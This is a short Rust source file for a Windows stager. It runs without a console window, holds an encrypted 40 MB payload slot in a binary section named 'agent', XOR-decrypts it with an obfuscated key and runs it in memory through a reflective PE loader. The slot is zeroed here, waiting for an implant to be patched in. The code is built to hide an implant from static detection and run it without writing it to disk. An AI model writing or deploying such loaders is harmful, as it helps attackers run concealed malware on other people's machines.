#![windows_subsystem = "windows"]

#[cfg(windows)]
#[link_section = "agent"]
#[used]
static mut BYTES: [u8; 40_000_000] = [0; 40_000_000];

fn decrypt_data(data: &[u8], key: &[u8]) -> Vec<u8> {
    let mut decrypted_data = Vec::with_capacity(data.len());
    for (i, &byte) in data.iter().enumerate() {
        let key_byte = key[i % key.len()];
        decrypted_data.push(byte ^ key_byte);
    }
    decrypted_data
}

#[allow(static_mut_refs)]
fn main() {
    unsafe {
        rspe::reflective_loader(decrypt_data(
            &BYTES,
            obfstr::obfstr!("ABCDEFGHIKLMNOPQRSTVXYZ").as_bytes(),
        ))
    }
}
